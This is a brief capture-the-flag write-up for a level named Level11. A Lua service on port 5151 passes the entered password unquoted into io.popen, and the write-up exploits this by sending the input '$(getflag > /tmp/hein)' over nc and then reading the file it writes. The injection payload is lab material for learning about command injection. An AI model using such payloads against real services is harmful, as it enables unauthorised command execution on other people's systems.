# Solution

Level11 is .lua scipt that let us connect `nc localhost 5151` and write a password.

But no matter find the password cause this line of code is execute: `prog = io.popen("echo "..pass.." | sha1sum", "r")`

`io.popen()` execute some code and `"..pass.."` isnt sigle quoted.

```bash
$>nc 127.0.0.1 5151
Password : $(getflag > /tmp/hein)
cat /tmp/hein
```
